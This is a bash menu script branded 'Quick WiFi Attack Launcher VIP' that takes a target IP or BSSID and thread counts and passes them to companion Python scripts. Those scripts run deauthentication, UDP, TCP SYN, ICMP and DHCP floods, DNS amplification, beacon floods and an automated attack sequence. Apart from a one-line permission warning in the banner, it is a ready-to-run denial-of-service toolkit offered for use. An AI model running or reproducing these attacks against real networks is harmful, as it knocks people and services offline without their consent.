#!/bin/bash

# Quick Attack Script - VIP Edition
# =================================

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              Quick WiFi Attack Launcher VIP                 ║"
echo "║                                                              ║"
echo "║  ⚠️  WARNING: EXTREMELY POWERFUL TESTING TOOL ⚠️            ║"
echo "║  Only use on networks you own or have permission to test    ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root (use sudo)"
   exit 1
fi

# Function to show menu
show_menu() {
    echo "🚀 QUICK ATTACK MENU:"
    echo "===================="
    echo "1. 💥 Advanced Deauth Attack (Multi-threaded)"
    echo "2. 🌊 UDP Flood Attack (High intensity)"
    echo "3. ⚡ TCP SYN Flood Attack"
    echo "4. 🔥 ICMP Flood Attack"
    echo "5. 📡 DHCP Discover Flood"
    echo "6. 🎯 DNS Amplification Attack"
    echo "7. 📻 Advanced Beacon Flood"
    echo "8. 🤖 Automated Attack Sequence"
    echo "9. 🎮 Interactive VIP GUI"
    echo "10. ❌ Exit"
    echo
}

# Function to get interface
get_interface() {
    echo "[*] Available network interfaces:"
    ip link show | grep -E "^[0-9]+:" | grep -v "lo:" | awk -F': ' '{print "  - " $2}' | cut -d'@' -f1
    echo
    read -p "[?] Enter interface name: " INTERFACE
    
    if ! ip link show "$INTERFACE" &>/dev/null; then
        echo "[!] Interface $INTERFACE not found!"
        exit 1
    fi
}

# Function to get target
get_target() {
    read -p "[?] Enter target IP/BSSID: " TARGET
    if [[ -z "$TARGET" ]]; then
        echo "[!] Target required!"
        exit 1
    fi
}

# Main menu loop
while true; do
    show_menu
    read -p "[?] Select option (1-10): " choice
    
    case $choice in
        1)
            echo "[💥 ADVANCED DEAUTH ATTACK]"
            get_interface
            get_target
            read -p "[?] Number of threads (default 15): " threads
            threads=${threads:-15}
            
            echo "[*] Starting advanced deauth attack..."
            python3 wifi_advanced_tester.py --deauth-advanced --bssid "$TARGET" -i "$INTERFACE" --threads "$threads"
            ;;
        2)
            echo "[🌊 UDP FLOOD ATTACK]"
            get_interface
            get_target
            read -p "[?] Target port (default 80): " port
            port=${port:-80}
            read -p "[?] Number of threads (default 50): " threads
            threads=${threads:-50}
            
            echo "[*] Starting UDP flood attack..."
            python3 wifi_advanced_tester.py --udp-flood -t "$TARGET" -p "$port" -i "$INTERFACE" --threads "$threads"
            ;;
        3)
            echo "[⚡ TCP SYN FLOOD ATTACK]"
            get_interface
            get_target
            read -p "[?] Target port (default 80): " port
            port=${port:-80}
            read -p "[?] Number of threads (default 40): " threads
            threads=${threads:-40}
            
            echo "[*] Starting TCP SYN flood attack..."
            python3 wifi_advanced_tester.py --syn-flood -t "$TARGET" -p "$port" -i "$INTERFACE" --threads "$threads"
            ;;
        4)
            echo "[🔥 ICMP FLOOD ATTACK]"
            get_interface
            get_target
            read -p "[?] Packet size (default 1024): " size
            size=${size:-1024}
            read -p "[?] Number of threads (default 30): " threads
            threads=${threads:-30}
            
            echo "[*] Starting ICMP flood attack..."
            python3 wifi_advanced_tester.py --icmp-flood -t "$TARGET" -i "$INTERFACE" --threads "$threads" --size "$size"
            ;;
        5)
            echo "[📡 DHCP DISCOVER FLOOD]"
            get_interface
            read -p "[?] Number of threads (default 25): " threads
            threads=${threads:-25}
            
            echo "[*] Starting DHCP discover flood..."
            python3 wifi_advanced_tester.py --dhcp-flood -i "$INTERFACE" --threads "$threads"
            ;;
        6)
            echo "[🎯 DNS AMPLIFICATION ATTACK]"
            get_interface
            get_target
            read -p "[?] Number of threads (default 20): " threads
            threads=${threads:-20}
            
            echo "[*] Starting DNS amplification attack..."
            python3 wifi_advanced_tester.py --dns-amp -t "$TARGET" -i "$INTERFACE" --threads "$threads"
            ;;
        7)
            echo "[📻 ADVANCED BEACON FLOOD]"
            get_interface
            read -p "[?] Number of threads (default 20): " threads
            threads=${threads:-20}
            read -p "[?] Number of fake APs (default 1000): " count
            count=${count:-1000}
            
            echo "[*] Starting advanced beacon flood..."
            python3 wifi_advanced_tester.py --beacon-advanced -i "$INTERFACE" --threads "$threads" --count "$count"
            ;;
        8)
            echo "[🤖 AUTOMATED ATTACK SEQUENCE]"
            get_interface
            
            if [[ ! -f "attack_config.json" ]]; then
                echo "[*] Creating default configuration..."
                python3 auto_attack.py --create-config
            fi
            
            echo "[*] Starting automated attack sequence..."
            python3 auto_attack.py -i "$INTERFACE"
            ;;
        9)
            echo "[🎮 LAUNCHING VIP GUI]"
            python3 wifi_advanced_gui.py
            ;;
        10)
            echo "[+] Goodbye!"
            exit 0
            ;;
        *)
            echo "[!] Invalid option!"
            ;;
    esac
    
    echo
    read -p "[*] Press Enter to return to menu..."
done